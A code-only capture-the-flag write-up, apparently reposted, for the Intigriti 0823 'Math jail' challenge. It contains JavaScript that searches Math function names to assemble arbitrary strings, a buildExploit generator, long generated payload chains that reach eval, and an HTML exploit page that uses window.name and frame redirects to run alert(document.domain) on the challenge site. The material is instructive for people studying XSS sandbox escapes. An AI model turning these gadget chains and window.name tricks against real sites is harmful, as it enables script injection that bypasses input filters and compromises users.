# Intigriti 0823 挑戰 – Math jail 解法以及心得

> 原文: https://www.ctfiot.com/132407.html
> ID: 132407


```
@copyright._Printer__filenames.append
@memoryview.__basicsize__.__sub__
@staticmethod.__basicsize__.__mul__
@object.__instancecheck__
class a:
pass
var arr = []
eval(arr.join(''.toString(arr.push('a'.toString()))))
// Uncaught ReferenceError: a is not defined
var arr = ['a','l','e','r']
eval(
 arr.join(
 ''.toString(
 arr.push(
 ')'.toString(
 arr.push(
 '('.toString(
 arr.push('t'.toString())
 )
 )
 )
 )
 )
 )
)
Math.seeds = [1,2,3,4]
Math.seeds.pop(Math.seeds.pop(Math.seeds.pop(Math.seeds.pop())))
console.log(Math.seeds) // []
function findTargetFromScope(scope, matchFn, initPath='') {
 let visited = new Set()
 let result = []

 findTarget(scope, initPath)

 // return the shortest one
 return result.sort((a, b) => a.length - b.length)[0]

 function findTarget(obj, path) {
 if(visited.has(obj)) return
 visited.add(obj)
 const list = Object.getOwnPropertyNames(obj)
 for(let key of list) {
 const item = obj[key]
 const newPath = path ? path + "." + key : key
 try {
 if (matchFn(item)) {
 result.push(newPath)
 continue
 }
 } catch(err){}

 if (item && typeof item === 'object') {
 findTarget(item, newPath)
 }
 }
 }
}
console.log(findTargetFromScope(Math, item => item.name.at(0) === 'a','Math'))
// Math.abs

console.log(findTargetFromScope(Math, item => item.name.at(1) === 'l','Math'))
// Math.clz32
const findMathName = (index, char) =>
 findTargetFromScope(Math, item => item.name.at(index) === char, 'Math')

console.log(findMathName(0, 'a')) // Math.abs
console.log(findMathName(1, 'l')) // Math.clz32
Math.seeds = []
Math.seeds.push(Math.log.name.at(Math.LN2.valueOf(Math.seeds.push(Math.abs.name.at()))))
const mapping = [
 ['Math.LN2.valueOf'], // 0
 ['Math.LOG2E.valueOf'], // 1
 ['Math.E.valueOf'], // 2
 ['Math.PI.valueOf'], // 3
]
function findTargetNumber(init, target) {
 let queue = [[[], init]]
 let visited = new Set()
 return bfs(target)

 function bfs(target) {
 while(queue.length) {
 let [path, current] = queue.shift()
 for(let key of Object.getOwnPropertyNames(Math)){
 if (typeof Math[key] !== 'function') continue
 let value = Math[key]?.(current)
 if (value && !Number.isNaN(value)) {
 let newPath = [`Math.${key}`, ...path]
 if (value === target) {
 return newPath
 }

 if (newPath.length >= 10) return

 if (!visited.has(value)) {
 visited.add(value)
 queue.push([newPath, value])
 }
 }
 }
 }
 }
}
console.log(findTargetNumber(5, '('.charCodeAt(0)))
// ['Math.floor', 'Math.log2', 'Math.cosh', 'Math.clz32']
Math.abs.name.constructor.fromCharCode(Math.floor(Math.log2(Math.cosh(Math.clz32(5)))))
// 假設我們已經有想要的陣列了
var arr = ['a','l','e','r','t','(',')']
console.log(
 arr.join(Math.abs.name.constructor.prototype.trim.call(Math.abs.name.constructor.fromCharCode(32)))
)
// alert()
Function('alert()')()
Math.abs.constructor('alert()')()
Math.abs.constructor.call.call(Math.abs.constructor('alert()'))
function findTargetFromScope(scope, matchFn, initPath='') {
 let visited = new Set()
 let result = []

 findTarget(scope, initPath)

 // return the shortest one
 return result.sort((a, b) => a.length - b.length)[0]

 function findTarget(obj, path) {
 if(visited.has(obj)) return
 visited.add(obj)
 const list = Object.getOwnPropertyNames(obj)
 for(let key of list) {
 const item = obj[key]
 const newPath = path ? path + "." + key : key
 try {
 if (matchFn(item)) {
 result.push(newPath)
 continue
 }
 } catch(err){}

 if (item && typeof item === 'object') {
 findTarget(item, newPath)
 }
 }
 }
}

function findTargetNumber(init, target) {
 let queue = [[[], init]]
 let visited = new Set()
 return bfs(target)

 function bfs(target) {
 while(queue.length) {
 let [path, current] = queue.shift()
 for(let key of Object.getOwnPropertyNames(Math)){
 if (typeof Math[key] !== 'function') continue
 let value = Math[key]?.(current)
 if (value && !Number.isNaN(value)) {
 let newPath = [`Math.${key}`, ...path]
 if (value === target) {
 return newPath
 }

 if (newPath.length >= 10) return

 if (!visited.has(value)) {
 visited.add(value)
 queue.push([newPath, value])
 }
 }
 }
 }
 }
}

function buildExploit(arrName, content) {
 let ans = []
 let currentIndex = 0
 let codeResult = ''

 for(let i=0; i<5; i++) {
 addFunction(`${arrName}.pop`)
 }

 const findMathName = (index, char) =>
 findTargetFromScope(Math, item => item.name.at(index) === char, 'Math')

 for(let char of content) {

 // if we can find it in the Math for the current index, use it
 let result = findMathName(currentIndex, char)
 if (result) {
 addFunction(`${result}.name.at`)
 addFunction(`${arrName}.push`)
 currentIndex++
 continue
 }

 const mapping = [
 ['Math.LN2.valueOf'], // 0
 ['Math.LOG2E.valueOf'], // 1
 ['Math.E.valueOf'], // 2
 ['Math.PI.valueOf'], // 3
 ]

 // try to find Math.fn[i] == char
 let found = false
 for(let i=0; i<mapping.length; i++) {
 result = findMathName(i, char)
 if (result) {
 addFunction(mapping[i][0])
 addFunction(`${result}.name.at`)
 addFunction(`${arrName}.push`)
 currentIndex++
 found = true
 break
 }
 }

 if (found) {
 continue
 }

 // if we can't, we use integer to make a string
 let mathResult = findTargetNumber(currentIndex, char.charCodeAt(0))
 mathResult.reverse() // remember to reverse cause the order
 for(let row of mathResult) {
 addFunction(row)
 }
 addFunction('Math.abs.name.constructor.fromCharCode')
 addFunction(`${arrName}.push`)
 currentIndex++
 }

 // add eval structure
 // generate space then trim
 let spaceResult = findTargetNumber(currentIndex, ' '.charCodeAt(0))
 spaceResult.reverse() // remember to reverse cause the order
 for(let row of spaceResult) {
 addFunction(row)
 }
 addFunction('Math.abs.name.constructor.fromCharCode')
 addFunction('Math.abs.name.constructor.prototype.trim.call')
 addFunction(`${arrName}.join`)
 addFunction('Math.abs.constructor')
 addFunction('Math.abs.constructor.prototype.call.call')

 return ans.reverse().join(',')
 //return codeResult

 function addFunction(name){
 ans.unshift(name)
 codeResult = `${name}(${codeResult})`
 }
}

console.log(buildExploit('Math.seeds', 'alert(document.domain)'))
Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.abs.name.at,Math.seeds.push,Math.clz32.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.round.name.at,Math.seeds.push,Math.hypot.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.log,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.imul.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.clz32,Math.sqrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.acosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call
- exp.html (top)
--- https://challenge-0823.intigriti.io (name: 'alert(1)')
------ https://challenge-0823.intigriti.io/challenge/index.html
- exp.html (top)
--- https://challenge-0823.intigriti.io (name: 'alert(1)')
------ https://challenge-0823.intigriti.io/challenge/index.html?q=...
<script>
setTimeout(() => {
frames[0].frames[0].location.replace('https://challenge-0823.intigriti.io/challenge/index.html?q=Math.random')
},3000)</script>

name = "alert(document.domain)"
document.location = "https://challenge-0823.intigriti.io/"
</script>
'>

Math.random = function () {
 if (!this.seeds) {
 this.seeds = [0.62536, 0.458483, 0.544523, 0.323421, 0.775465]
 next = this.seeds[new Date().getTime() % this.seeds.length]
 }
 next = next * 1103515245 + 12345
 return (next / 65536) % 32767
}
Math.imul,Math.seeds.splice,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.valueOf.name.at,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.isPrototypeOf.name.length.valueOf,Math.log2,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.pow.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.codePointAt.name.at,Math.seeds.push,Math.PI.valueOf,Math.exp,Math.acosh,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.asinh,Math.log2,Math.tan,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.random.name.valueOf,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call
function findTargetFromScope(scope, matchFn, initPath='') {
 let visited = new Set()
 let result = []

 findTarget(scope, initPath)

 // return the shortest one
 return result.sort((a, b) => a.length - b.length)[0]

 function findTarget(obj, path) {
 if(visited.has(obj)) return
 visited.add(obj)
 const list = Object.getOwnPropertyNames(obj)
 for(let key of list) {
 const item = obj[key]
 const newPath = path ? path + "." + key : key
 try {
 if (matchFn(item)) {
 result.push(newPath)
 continue
 }
 } catch(err){}

 if (item && typeof item === 'object') {
 findTarget(item, newPath)
 }
 }
 }
}

function findTargetNumber(init, target) {
 let queue = [[[], init]]
 let visited = new Set()
 return bfs(target)

 function bfs(target) {
 while(queue.length) {
 let [path, current] = queue.shift()
 for(let key of Object.getOwnPropertyNames(Math)){
 if (typeof Math[key] !== 'function') continue
 let value = Math[key]?.(current)
 if (value && !Number.isNaN(value)) {
 let newPath = [`Math.${key}`, ...path]
 if (value === target) {
 return newPath
 }

 if (newPath.length >= 10) return

 if (!visited.has(value)) {
 visited.add(value)
 queue.push([newPath, value])
 }
 }
 }
 }
 }
}

function buildExploit(arrName, content) {
 let ans = []
 let currentIndex = 0
 let codeResult = ''

 // @credit: @y0d3n
 addFunction('Math.imul')
 addFunction('Math.seeds.splice')

 const findMathName = (index, char) =>
 findTargetFromScope(Math, item => item.name.at(index) === char, 'Math') || findTargetFromScope(Math.abs.name.constructor, item => item.name.at(index) === char, 'Math.abs.name.constructor')

 for(let char of content) {
 console.log(char)

 // if we can find it in the Math for the current index, use it
 let result = findMathName(currentIndex, char)
 if (result) {
 addFunction(`${result}.name.at`)
 addFunction(`${arrName}.push`)
 currentIndex++
 continue
 }

 const mapping = [
 ['Math.LN2.valueOf'], // 0
 ['Math.LOG2E.valueOf'], // 1
 ['Math.E.valueOf'], // 2
 ['Math.PI.valueOf'], // 3
 ]

 // try to find Math.fn[i] == char
 let found = false
 for(let i=0; i<mapping.length; i++) {
 result = findMathName(i, char)
 if (char === 'v' && !result) {
 result = 'Math.LN2.valueOf'
 }
 if (result) {
 addFunction(mapping[i][0])
 addFunction(`${result}.name.at`)
 addFunction(`${arrName}.push`)
 currentIndex++
 found = true
 break
 }
 }

 if (found) {
 continue
 }

 // @credit: @Astrid
 if (char === '(') {
 addFunction('Math.isPrototypeOf.name.length.valueOf')
 addFunction('Math.log2')
 addFunction('Math.exp')
 addFunction('Math.abs.name.constructor.fromCharCode')
 addFunction(`${arrName}.push`)
 currentIndex++
 } else if (char === '.') {
 addFunction('Math.PI.valueOf')
 addFunction('Math.exp')
 addFunction('Math.acosh')
 addFunction('Math.exp')
 addFunction('Math.abs.name.constructor.fromCharCode')
 addFunction(`${arrName}.push`)
 currentIndex++
 } else {

 let mathResult = findTargetNumber(currentIndex, char.charCodeAt(0))
 mathResult.reverse() // remember to reverse cause the order
 for(let row of mathResult) {
 addFunction(row)
 }
 addFunction('Math.abs.name.constructor.fromCharCode')
 addFunction(`${arrName}.push`)
 currentIndex++
 }
 }

 // add eval structure
 addFunction('Math.random.name.valueOf')
 addFunction(`${arrName}.join`)
 addFunction('Math.abs.constructor')
 addFunction('Math.abs.constructor.prototype.call.call')

 return ans.reverse()

 function addFunction(name){
 ans.unshift(name)
 codeResult = `${name}(${codeResult})`
 }
}

Math.seeds = []
// @credit: @DrBrix
const arr = buildExploit('Math.seeds', 'eval(parent.name)')
console.log('length:', arr.length)
console.log(arr.join(','))
```
